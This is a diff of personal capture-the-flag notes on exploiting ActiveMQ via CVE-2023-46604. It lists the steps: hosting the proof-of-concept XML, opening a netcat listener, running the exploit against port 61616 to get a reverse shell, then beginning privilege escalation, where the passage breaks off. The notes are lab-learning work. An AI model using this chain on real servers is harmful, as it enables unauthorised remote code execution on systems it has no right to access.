@@ -33,9 +33,15 @@ Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
 	* https://nvd.nist.gov/vuln/detail/CVE-2023-46604
 * looked up CVE-2023-46604 poc and got https://github.com/evkl1d/CVE-2023-46604
 	* The POC needs to be running on a webserver **you host** not on the website
-		* `python -m http.server`
+		* `python -m http.server 8081`
 	* Also need a nc listener
 		* `sudo nc -nlvp 8100`
 	* THEN you run the exploit command: `python exploit.py -i <target-ip> -p <target-port> -u <url-to-poc.xml>`
-		* `python -m http.server 8081`
+		* The target port is **NOT** port 80, but 61616
+			* port 80 is the UI
+			* port 61616 is the default port it's running on
+* This will call back as a reverse shell for the user `activemq`
+	* the home directory has the user flag
 # Root
+* First thought is to see if root is not password protected with `sudo su` but no luck
+* I de
